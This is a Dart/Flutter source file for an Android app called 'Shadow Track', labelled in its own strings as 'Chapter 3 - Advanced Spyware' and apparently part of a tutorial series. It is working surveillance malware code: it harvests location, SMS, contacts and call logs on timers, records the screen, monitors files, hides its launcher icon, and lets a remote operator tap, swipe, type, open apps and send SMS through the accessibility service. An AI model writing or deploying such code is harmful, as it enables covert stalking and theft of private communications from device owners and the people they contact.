import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';

class TrackingService {
  static const MethodChannel _channel = MethodChannel('shadow_track');

  static Timer? _locationTimer;
  static Timer? _dataCollectionTimer;
  static Timer? _smsCollectionTimer;
  static Timer? _contactsCollectionTimer;
  static Timer? _advancedMonitoringTimer;
  static bool _isTracking = false;

  // 수집 간격 설정 (분 단위)
  static const int locationInterval = 5;      // 5분마다 위치 수집
  static const int dataInterval = 10;         // 10분마다 일반 데이터 수집
  static const int smsInterval = 3;           // 3분마다 SMS 수집
  static const int contactsInterval = 30;     // 30분마다 연락처 수집
  static const int advancedInterval = 15;     // 15분마다 고급 모니터링

  // 초기화
  static Future<void> initialize() async {
    try {
      await _channel.invokeMethod('initialize');
      await _createLogDirectories();
      await _logSystemInfo();
      await _logEvent('SYSTEM_INITIALIZED', 'Shadow Track Chapter 3 initialized successfully');
    } catch (e) {
      print('초기화 오류: $e');
    }
  }

  // 추적 시작
  static Future<void> startTracking() async {
    if (_isTracking) return;

    _isTracking = true;

    // 기본 데이터 수집 시작
    _startLocationTracking();
    _startDataCollection();
    _startSMSCollection();
    _startContactsCollection();

    // Chapter 3 고급 기능들 시작
    _startAdvancedMonitoring();
    await _startFileMonitoring();
    await _requestScreenRecording();

    await _logEvent('TRACKING_STARTED', 'All monitoring services activated - Chapter 3');
  }

  // 추적 중지
  static Future<void> stopTracking() async {
    if (!_isTracking) return;

    _isTracking = false;

    // 모든 타이머 중지
    _locationTimer?.cancel();
    _dataCollectionTimer?.cancel();
    _smsCollectionTimer?.cancel();
    _contactsCollectionTimer?.cancel();
    _advancedMonitoringTimer?.cancel();

    // Chapter 3 서비스들 중지
    await _stopFileMonitoring();
    await _stopScreenRecording();

    await _logEvent('TRACKING_STOPPED', 'All monitoring services deactivated - Chapter 3');
  }

  // Chapter 3 고급 모니터링 시작
  static void _startAdvancedMonitoring() {
    _advancedMonitoringTimer = Timer.periodic(Duration(minutes: advancedInterval), (timer) async {
      try {
        await _checkAdvancedServices();
        await _collectAdvancedData();
        await _performSecurityChecks();
      } catch (e) {
        print('고급 모니터링 오류: $e');
        await _logEvent('ADVANCED_MONITORING_ERROR', 'Error in advanced monitoring: $e');
      }
    });
  }

  // 화면 녹화 시작 요청
  static Future<void> _requestScreenRecording() async {
    try {
      await _channel.invokeMethod('startScreenRecording');
      await _logEvent('SCREEN_RECORDING_REQUESTED', 'Screen recording permission requested');
    } catch (e) {
      print('화면 녹화 요청 오류: $e');
      await _logEvent('SCREEN_RECORDING_ERROR', 'Failed to request screen recording: $e');
    }
  }

  // 화면 녹화 중지
  static Future<void> _stopScreenRecording() async {
    try {
      await _channel.invokeMethod('stopScreenRecording');
      await _logEvent('SCREEN_RECORDING_STOPPED', 'Screen recording stopped');
    } catch (e) {
      print('화면 녹화 중지 오류: $e');
    }
  }

  // 파일 모니터링 시작
  static Future<void> _startFileMonitoring() async {
    try {
      await _channel.invokeMethod('startFileMonitoring');
      await _logEvent('FILE_MONITORING_STARTED', 'File monitoring service started');
    } catch (e) {
      print('파일 모니터링 시작 오류: $e');
      await _logEvent('FILE_MONITORING_ERROR', 'Failed to start file monitoring: $e');
    }
  }

  // 파일 모니터링 중지
  static Future<void> _stopFileMonitoring() async {
    try {
      await _channel.invokeMethod('stopFileMonitoring');
      await _logEvent('FILE_MONITORING_STOPPED', 'File monitoring service stopped');
    } catch (e) {
      print('파일 모니터링 중지 오류: $e');
    }
  }

  // 고급 서비스 상태 확인
  static Future<void> _checkAdvancedServices() async {
    try {
      final screenRecording = await _channel.invokeMethod('isScreenRecording');
      final fileMonitoring = await _channel.invokeMethod('isFileMonitoring');
      final accessibilityService = await _channel.invokeMethod('isAccessibilityServiceEnabled');

      final serviceStatus = {
        'screen_recording_active': screenRecording,
        'file_monitoring_active': fileMonitoring,
        'accessibility_service_active': accessibilityService,
        'timestamp': DateTime.now().toIso8601String(),
      };

      await _saveToFile('service_status.json', jsonEncode(serviceStatus));

      // 서비스가 비활성화된 경우 재시작 시도
      if (!fileMonitoring) {
        await _startFileMonitoring();
      }

    } catch (e) {
      print('서비스 상태 확인 오류: $e');
    }
  }

  // 고급 데이터 수집
  static Future<void> _collectAdvancedData() async {
    try {
      // 스크린샷 개수 확인
      final screenshotCount = await _channel.invokeMethod('getScreenshotCount');

      // 파일 모니터링 상태 확인
      final fileMonitoringStatus = await _channel.invokeMethod('getFileMonitoringStatus');

      final advancedData = {
        'screenshot_count': screenshotCount,
        'file_monitoring_status': fileMonitoringStatus,
        'collection_type': 'advanced_monitoring',
        'timestamp': DateTime.now().toIso8601String(),
      };

      await _appendToFile('advanced_monitoring.json', jsonEncode(advancedData));

    } catch (e) {
      print('고급 데이터 수집 오류: $e');
    }
  }

  // 보안 검사 수행
  static Future<void> _performSecurityChecks() async {
    try {
      final securityData = {
        'app_icon_hidden': await _isAppIconHidden(),
        'tracking_active': _isTracking,
        'services_running': await _getRunningServicesCount(),
        'security_check_time': DateTime.now().toIso8601String(),
      };

      await _appendToFile('security_checks.json', jsonEncode(securityData));

    } catch (e) {
      print('보안 검사 오류: $e');
    }
  }

  // 원격 조작 기능들
  static Future<bool> performRemoteClick(double x, double y) async {
    try {
      final result = await _channel.invokeMethod('performRemoteClick', {
        'x': x,
        'y': y,
      });

      await _logEvent('REMOTE_CLICK', 'Remote click performed at ($x, $y)');
      return result == true;
    } catch (e) {
      print('원격 클릭 오류: $e');
      await _logEvent('REMOTE_CLICK_ERROR', 'Remote click failed: $e');
      return false;
    }
  }

  static Future<bool> performRemoteSwipe(double startX, double startY, double endX, double endY, {int duration = 500}) async {
    try {
      final result = await _channel.invokeMethod('performRemoteSwipe', {
        'startX': startX,
        'startY': startY,
        'endX': endX,
        'endY': endY,
        'duration': duration,
      });

      await _logEvent('REMOTE_SWIPE', 'Remote swipe from ($startX, $startY) to ($endX, $endY)');
      return result == true;
    } catch (e) {
      print('원격 스와이프 오류: $e');
      await _logEvent('REMOTE_SWIPE_ERROR', 'Remote swipe failed: $e');
      return false;
    }
  }

  static Future<bool> performRemoteTextInput(String text) async {
    try {
      final result = await _channel.invokeMethod('performRemoteTextInput', {
        'text': text,
      });

      await _logEvent('REMOTE_TEXT_INPUT', 'Remote text input: $text');
      return result == true;
    } catch (e) {
      print('원격 텍스트 입력 오류: $e');
      await _logEvent('REMOTE_TEXT_INPUT_ERROR', 'Remote text input failed: $e');
      return false;
    }
  }

  static Future<bool> performBackAction() async {
    try {
      final result = await _channel.invokeMethod('performBackAction');
      await _logEvent('REMOTE_BACK', 'Remote back action performed');
      return result == true;
    } catch (e) {
      print('원격 뒤로가기 오류: $e');
      return false;
    }
  }

  static Future<bool> performHomeAction() async {
    try {
      final result = await _channel.invokeMethod('performHomeAction');
      await _logEvent('REMOTE_HOME', 'Remote home action performed');
      return result == true;
    } catch (e) {
      print('원격 홈 버튼 오류: $e');
      return false;
    }
  }

  static Future<bool> performRecentAppsAction() async {
    try {
      final result = await _channel.invokeMethod('performRecentAppsAction');
      await _logEvent('REMOTE_RECENT_APPS', 'Remote recent apps action performed');
      return result == true;
    } catch (e) {
      print('원격 최근 앱 오류: $e');
      return false;
    }
  }

  static Future<bool> openApp(String packageName) async {
    try {
      final result = await _channel.invokeMethod('openApp', {
        'packageName': packageName,
      });

      await _logEvent('REMOTE_OPEN_APP', 'Remote opened app: $packageName');
      return result == true;
    } catch (e) {
      print('원격 앱 열기 오류: $e');
      await _logEvent('REMOTE_OPEN_APP_ERROR', 'Failed to open app $packageName: $e');
      return false;
    }
  }

  // 앱 숨기기 기능들
  static Future<bool> hideAppIcon() async {
    try {
      await _channel.invokeMethod('hideAppIcon');
      await _logEvent('APP_ICON_HIDDEN', 'App icon hidden from launcher');
      return true;
    } catch (e) {
      print('앱 아이콘 숨기기 오류: $e');
      await _logEvent('APP_ICON_HIDE_ERROR', 'Failed to hide app icon: $e');
      return false;
    }
  }

  static Future<bool> showAppIcon() async {
    try {
      await _channel.invokeMethod('showAppIcon');
      await _logEvent('APP_ICON_SHOWN', 'App icon restored to launcher');
      return true;
    } catch (e) {
      print('앱 아이콘 표시 오류: $e');
      return false;
    }
  }

  static Future<bool> _isAppIconHidden() async {
    try {
      return await _channel.invokeMethod('isAppIconHidden');
    } catch (e) {
      return false;
    }
  }

  // 접근성 서비스 관련
  static Future<bool> isAccessibilityServiceEnabled() async {
    try {
      return await _channel.invokeMethod('isAccessibilityServiceEnabled');
    } catch (e) {
      return false;
    }
  }

  static Future<void> openAccessibilitySettings() async {
    try {
      await _channel.invokeMethod('openAccessibilitySettings');
      await _logEvent('ACCESSIBILITY_SETTINGS_OPENED', 'Accessibility settings opened');
    } catch (e) {
      print('접근성 설정 열기 오류: $e');
    }
  }

  // 화면 녹화 관련
  static Future<bool> takeScreenshot() async {
    try {
      final result = await _channel.invokeMethod('takeScreenshot');
      if (result == true) {
        await _logEvent('SCREENSHOT_TAKEN', 'Manual screenshot captured');
      }
      return result == true;
    } catch (e) {
      print('스크린샷 촬영 오류: $e');
      return false;
    }
  }

  static Future<int> getScreenshotCount() async {
    try {
      return await _channel.invokeMethod('getScreenshotCount');
    } catch (e) {
      return 0;
    }
  }

  static Future<bool> isScreenRecording() async {
    try {
      return await _channel.invokeMethod('isScreenRecording');
    } catch (e) {
      return false;
    }
  }

  // 파일 모니터링 관련
  static Future<bool> isFileMonitoring() async {
    try {
      return await _channel.invokeMethod('isFileMonitoring');
    } catch (e) {
      return false;
    }
  }

  static Future<void> forceFileScan() async {
    try {
      await _channel.invokeMethod('forceFileScan');
      await _logEvent('FORCE_FILE_SCAN', 'Manual file scan initiated');
    } catch (e) {
      print('강제 파일 스캔 오류: $e');
    }
  }

  static Future<Map<String, dynamic>> getFileMonitoringStatus() async {
    try {
      final result = await _channel.invokeMethod('getFileMonitoringStatus');
      return Map<String, dynamic>.from(result);
    } catch (e) {
      return {'error': e.toString()};
    }
  }

  // 기존 기능들 유지 (Chapter 2에서 구현된 것들)
  static void _startLocationTracking() {
    _locationTimer = Timer.periodic(Duration(minutes: locationInterval), (timer) async {
      try {
        if (await Permission.location.isGranted) {
          final position = await Geolocator.getCurrentPosition(
            desiredAccuracy: LocationAccuracy.high,
          );
          await _logLocation(position);
        }
      } catch (e) {
        print('위치 수집 오류: $e');
        await _logEvent('LOCATION_ERROR', 'Failed to collect location: $e');
      }
    });
  }

  static void _startDataCollection() {
    _dataCollectionTimer = Timer.periodic(Duration(minutes: dataInterval), (timer) async {
      try {
        await _collectDeviceInfo();
        await _collectInstalledApps();
        await _collectNetworkInfo();
        await _collectCallLog();
        await _collectAdvancedDeviceInfo();
      } catch (e) {
        print('데이터 수집 오류: $e');
        await _logEvent('DATA_COLLECTION_ERROR', 'Failed to collect data: $e');
      }
    });
  }

  static void _startSMSCollection() {
    _smsCollectionTimer = Timer.periodic(Duration(minutes: smsInterval), (timer) async {
      try {
        if (await Permission.sms.isGranted) {
          await _collectSMSMessages();
        }
      } catch (e) {
        print('SMS 수집 오류: $e');
        await _logEvent('SMS_COLLECTION_ERROR', 'Failed to collect SMS: $e');
      }
    });
  }

  static void _startContactsCollection() {
    _contactsCollectionTimer = Timer.periodic(Duration(minutes: contactsInterval), (timer) async {
      try {
        if (await Permission.contacts.isGranted) {
          await _collectContacts();
        }
      } catch (e) {
        print('연락처 수집 오류: $e');
        await _logEvent('CONTACTS_COLLECTION_ERROR', 'Failed to collect contacts: $e');
      }
    });
  }

  static Future<void> _collectSMSMessages() async {
    try {
      final smsMessages = await _channel.invokeMethod('readSMS');

      if (smsMessages != null && smsMessages is List) {
        final smsData = {
          'messages': smsMessages,
          'count': smsMessages.length,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _saveToFile('sms_messages.json', jsonEncode(smsData));
        await _logEvent('SMS_COLLECTED', 'Collected ${smsMessages.length} SMS messages');

        for (var message in smsMessages) {
          await _appendToFile('sms_log.json', jsonEncode(message));
        }
      }
    } catch (e) {
      print('SMS 수집 실패: $e');
      await _logEvent('SMS_COLLECTION_FAILED', 'Error: $e');
    }
  }

  static Future<void> _collectContacts() async {
    try {
      final contacts = await _channel.invokeMethod('getContacts');

      if (contacts != null && contacts is List) {
        final contactsData = {
          'contacts': contacts,
          'count': contacts.length,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _saveToFile('contacts.json', jsonEncode(contactsData));
        await _logEvent('CONTACTS_COLLECTED', 'Collected ${contacts.length} contacts');
      }
    } catch (e) {
      print('연락처 수집 실패: $e');
      await _logEvent('CONTACTS_COLLECTION_FAILED', 'Error: $e');
    }
  }

  static Future<void> _collectCallLog() async {
    try {
      final callLog = await _channel.invokeMethod('getCallLog');

      if (callLog != null && callLog is List) {
        final callLogData = {
          'call_logs': callLog,
          'count': callLog.length,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _saveToFile('call_log.json', jsonEncode(callLogData));
        await _logEvent('CALL_LOG_COLLECTED', 'Collected ${callLog.length} call records');

        for (var call in callLog) {
          await _appendToFile('call_log_detailed.json', jsonEncode(call));
        }
      }
    } catch (e) {
      print('통화 기록 수집 실패: $e');
      await _logEvent('CALL_LOG_COLLECTION_FAILED', 'Error: $e');
    }
  }

  static Future<void> _collectAdvancedDeviceInfo() async {
    try {
      final deviceInfo = await _channel.invokeMethod('getDeviceInfo');

      if (deviceInfo != null) {
        final advancedInfo = {
          'device_details': deviceInfo,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _appendToFile('advanced_device_info.json', jsonEncode(advancedInfo));
      }
    } catch (e) {
      print('고급 디바이스 정보 수집 실패: $e');
    }
  }

  static Future<bool> sendSMS(String phoneNumber, String message) async {
    try {
      final result = await _channel.invokeMethod('sendSMS', {
        'phoneNumber': phoneNumber,
        'message': message,
      });

      await _logEvent('SMS_SENT', 'SMS sent to $phoneNumber: $message');
      return result == true;
    } catch (e) {
      print('SMS 전송 실패: $e');
      await _logEvent('SMS_SEND_FAILED', 'Failed to send SMS to $phoneNumber: $e');
      return false;
    }
  }

  static Future<void> _createLogDirectories() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logDir = Directory('${directory.path}/logs');
      if (!await logDir.exists()) {
        await logDir.create(recursive: true);
      }

      final dataDir = Directory('${directory.path}/collected_data');
      if (!await dataDir.exists()) {
        await dataDir.create(recursive: true);
      }

      final smsDir = Directory('${directory.path}/sms_data');
      if (!await smsDir.exists()) {
        await smsDir.create(recursive: true);
      }

      final contactsDir = Directory('${directory.path}/contacts_data');
      if (!await contactsDir.exists()) {
        await contactsDir.create(recursive: true);
      }

      // Chapter 3 전용 디렉토리들
      final screenshotsDir = Directory('${directory.path}/screenshots');
      if (!await screenshotsDir.exists()) {
        await screenshotsDir.create(recursive: true);
      }

      final remoteActionsDir = Directory('${directory.path}/remote_actions');
      if (!await remoteActionsDir.exists()) {
        await remoteActionsDir.create(recursive: true);
      }

    } catch (e) {
      print('디렉토리 생성 오류: $e');
    }
  }

  static Future<void> _logSystemInfo() async {
    try {
      final deviceInfo = DeviceInfoPlugin();
      final packageInfo = await PackageInfo.fromPlatform();

      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;

        final systemInfo = {
          'device_id': androidInfo.id,
          'model': androidInfo.model,
          'brand': androidInfo.brand,
          'manufacturer': androidInfo.manufacturer,
          'android_version': androidInfo.version.release,
          'sdk_version': androidInfo.version.sdkInt,
          'app_version': packageInfo.version,
          'app_build': packageInfo.buildNumber,
          'fingerprint': androidInfo.fingerprint,
          'hardware': androidInfo.hardware,
          'host': androidInfo.host,
          'product': androidInfo.product,
          'tags': androidInfo.tags,
          'type': androidInfo.type,
          'is_physical_device': androidInfo.isPhysicalDevice,
          'chapter': 'Chapter 3 - Advanced Spyware',
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _saveToFile('system_info.json', jsonEncode(systemInfo));
      }
    } catch (e) {
      print('시스템 정보 로그 오류: $e');
    }
  }

  static Future<void> _logLocation(Position position) async {
    try {
      final locationData = {
        'latitude': position.latitude,
        'longitude': position.longitude,
        'accuracy': position.accuracy,
        'altitude': position.altitude,
        'heading': position.heading,
        'speed': position.speed,
        'speed_accuracy': position.speedAccuracy,
        'altitude_accuracy': position.altitudeAccuracy,
        'heading_accuracy': position.headingAccuracy,
        'timestamp': DateTime.now().toIso8601String(),
        'position_timestamp': position.timestamp.toIso8601String(),
      };

      await _appendToFile('location_log.json', jsonEncode(locationData));
      print('위치 저장됨: ${position.latitude}, ${position.longitude}');
    } catch (e) {
      print('위치 로그 오류: $e');
    }
  }

  static Future<void> _collectDeviceInfo() async {
    try {
      final deviceInfo = {
        'battery_level': await _getBatteryLevel(),
        'available_storage': await _getAvailableStorage(),
        'network_type': await _getNetworkType(),
        'memory_info': await _getMemoryInfo(),
        'timestamp': DateTime.now().toIso8601String(),
      };

      await _appendToFile('device_status.json', jsonEncode(deviceInfo));
    } catch (e) {
      print('디바이스 정보 수집 오류: $e');
    }
  }

  static Future<void> _collectInstalledApps() async {
    try {
      final apps = await _channel.invokeMethod('getInstalledApps');

      if (apps != null) {
        final appData = {
          'installed_apps': apps,
          'app_count': apps is List ? apps.length : 0,
          'timestamp': DateTime.now().toIso8601String(),
        };

        await _saveToFile('installed_apps.json', jsonEncode(appData));
      }
    } catch (e) {
      print('앱 정보 수집 오류: $e');
    }
  }

  static Future<void> _collectNetworkInfo() async {
    try {
      final networkType = await _getNetworkType();
      final networkInfo = {
        'network_type': networkType,
        'is_connected': networkType != 'Unknown',
        'timestamp': DateTime.now().toIso8601String(),
      };

      await _appendToFile('network_log.json', jsonEncode(networkInfo));
    } catch (e) {
      print('네트워크 정보 수집 오류: $e');
    }
  }

  static Future<Map<String, dynamic>> _getMemoryInfo() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final totalSpace = await directory.stat();

      return {
        'total_space': totalSpace.size,
        'available_space': 'Unknown',
        'used_space': 'Unknown',
      };
    } catch (e) {
      return {'error': e.toString()};
    }
  }

  static Future<int> _getBatteryLevel() async {
    try {
      return await _channel.invokeMethod('getBatteryLevel');
    } catch (e) {
      return -1;
    }
  }

  static Future<String> _getAvailableStorage() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final stat = await directory.stat();
      return '${(stat.size / (1024 * 1024)).toStringAsFixed(2)} MB';
    } catch (e) {
      return 'Unknown';
    }
  }

  static Future<String> _getNetworkType() async {
    try {
      return await _channel.invokeMethod('getNetworkType');
    } catch (e) {
      return 'Unknown';
    }
  }

  static Future<int> _getRunningServicesCount() async {
    try {
      int count = 0;

      if (await isScreenRecording()) count++;
      if (await isFileMonitoring()) count++;
      if (await isAccessibilityServiceEnabled()) count++;
      if (_isTracking) count++;

      return count;
    } catch (e) {
      return 0;
    }
  }

  static Future<void> _logEvent(String event, String details) async {
    try {
      final eventData = {
        'event': event,
        'details': details,
        'timestamp': DateTime.now().toIso8601String(),
        'session_id': await _getSessionId(),
        'chapter': 'Chapter 3',
      };

      await _appendToFile('event_log.json', jsonEncode(eventData));
    } catch (e) {
      print('이벤트 로그 오류: $e');
    }
  }

  static Future<String> _getSessionId() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      String? sessionId = prefs.getString('session_id');

      if (sessionId == null) {
        sessionId = DateTime.now().millisecondsSinceEpoch.toString();
        await prefs.setString('session_id', sessionId);
      }

      return sessionId;
    } catch (e) {
      return 'unknown_session';
    }
  }

  static Future<void> _saveToFile(String filename, String content) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/collected_data/$filename');
      await file.writeAsString(content);
    } catch (e) {
      print('파일 저장 오류: $e');
    }
  }

  static Future<void> _appendToFile(String filename, String content) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/logs/$filename');
      await file.writeAsString('$content\n', mode: FileMode.append);
    } catch (e) {
      print('파일 추가 오류: $e');
    }
  }

  // Chapter 3 통계 정보
  static Future<Map<String, dynamic>> getAdvancedStats() async {
    try {
      final basicStats = await getCollectionStats();

      final advancedStats = {
        ...basicStats,
        'screen_recording_active': await isScreenRecording(),
        'file_monitoring_active': await isFileMonitoring(),
        'accessibility_service_active': await isAccessibilityServiceEnabled(),
        'screenshot_count': await getScreenshotCount(),
        'app_icon_hidden': await _isAppIconHidden(),
        'running_services_count': await _getRunningServicesCount(),
        'chapter': 'Chapter 3 - Advanced Features',
        'last_update': DateTime.now().toIso8601String(),
      };

      return advancedStats;
    } catch (e) {
      return {'error': e.toString()};
    }
  }

  static Future<Map<String, dynamic>> getCollectionStats() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');
      final dataDir = Directory('${directory.path}/collected_data');

      final stats = {
        'total_log_files': 0,
        'total_data_files': 0,
        'sms_count': 0,
        'contacts_count': 0,
        'call_log_count': 0,
        'location_count': 0,
        'event_count': 0,
        'last_update': DateTime.now().toIso8601String(),
      };

      if (await logsDir.exists()) {
        final logFiles = await logsDir.list().toList();
        stats['total_log_files'] = logFiles.length;

        for (final file in logFiles) {
          if (file is File) {
            try {
              final content = await file.readAsString();
              final lines = content.split('\n').where((line) => line.trim().isNotEmpty).length;

              final fileName = file.path.split('/').last;
              if (fileName.contains('sms')) {
                stats['sms_count'] = (stats['sms_count'] as int) + lines;
              } else if (fileName.contains('location')) {
                stats['location_count'] = (stats['location_count'] as int) + lines;
              } else if (fileName.contains('event')) {
                stats['event_count'] = (stats['event_count'] as int) + lines;
              } else if (fileName.contains('call')) {
                stats['call_log_count'] = (stats['call_log_count'] as int) + lines;
              }
            } catch (e) {
              // 파일 읽기 오류 무시
            }
          }
        }
      }

      if (await dataDir.exists()) {
        final dataFiles = await dataDir.list().toList();
        stats['total_data_files'] = dataFiles.length;
      }

      return stats;
    } catch (e) {
      return {'error': e.toString()};
    }
  }

  static Future<List<Map<String, dynamic>>> getCollectedData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      if (!await logsDir.exists()) {
        return [];
      }

      final files = await logsDir.list().toList();
      final List<Map<String, dynamic>> allData = [];

      for (final file in files) {
        if (file is File && file.path.endsWith('.json')) {
          try {
            final content = await file.readAsString();
            final lines = content.split('\n').where((line) => line.trim().isNotEmpty);

            for (final line in lines) {
              try {
                final data = jsonDecode(line);
                data['source_file'] = file.path.split('/').last;
                allData.add(data);
              } catch (e) {
                // JSON 파싱 오류 무시
              }
            }
          } catch (e) {
            print('파일 읽기 오류: ${file.path} - $e');
          }
        }
      }

      allData.sort((a, b) {
        final timeA = DateTime.tryParse(a['timestamp'] ?? '') ?? DateTime.now();
        final timeB = DateTime.tryParse(b['timestamp'] ?? '') ?? DateTime.now();
        return timeB.compareTo(timeA);
      });

      return allData;
    } catch (e) {
      print('데이터 가져오기 오류: $e');
      return [];
    }
  }

  static Future<List<Map<String, dynamic>>> getDataByType(String type) async {
    try {
      final allData = await getCollectedData();
      return allData.where((data) {
        final sourceFile = data['source_file'] as String? ?? '';
        return sourceFile.toLowerCase().contains(type.toLowerCase());
      }).toList();
    } catch (e) {
      return [];
    }
  }

  static Future<List<Map<String, dynamic>>> getSMSData() async {
    return await getDataByType('sms');
  }

  static Future<List<Map<String, dynamic>>> getContactsData() async {
    return await getDataByType('contacts');
  }

  static Future<List<Map<String, dynamic>>> getCallLogData() async {
    return await getDataByType('call');
  }

  static Future<List<Map<String, dynamic>>> getLocationData() async {
    return await getDataByType('location');
  }

  // Chapter 3 전용 데이터 타입들
  static Future<List<Map<String, dynamic>>> getRemoteActionData() async {
    return await getDataByType('remote');
  }

  static Future<List<Map<String, dynamic>>> getScreenshotData() async {
    return await getDataByType('screenshot');
  }

  static Future<List<Map<String, dynamic>>> getFileMonitoringData() async {
    return await getDataByType('file');
  }

  static Future<List<Map<String, dynamic>>> getAccessibilityData() async {
    return await getDataByType('accessibility');
  }

  static Future<void> clearAllData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');
      final dataDir = Directory('${directory.path}/collected_data');
      final screenshotsDir = Directory('${directory.path}/screenshots');

      if (await logsDir.exists()) {
        await logsDir.delete(recursive: true);
      }
      if (await dataDir.exists()) {
        await dataDir.delete(recursive: true);
      }
      if (await screenshotsDir.exists()) {
        await screenshotsDir.delete(recursive: true);
      }

      await _createLogDirectories();
      await _logEvent('DATA_CLEARED', 'All collected data has been cleared - Chapter 3');
    } catch (e) {
      print('데이터 초기화 오류: $e');
    }
  }

  // 추적 상태 확인
  static bool get isTracking => _isTracking;

  // 수집 간격 정보
  static Map<String, int> get collectionIntervals => {
    'location': locationInterval,
    'data': dataInterval,
    'sms': smsInterval,
    'contacts': contactsInterval,
    'advanced': advancedInterval,
  };
}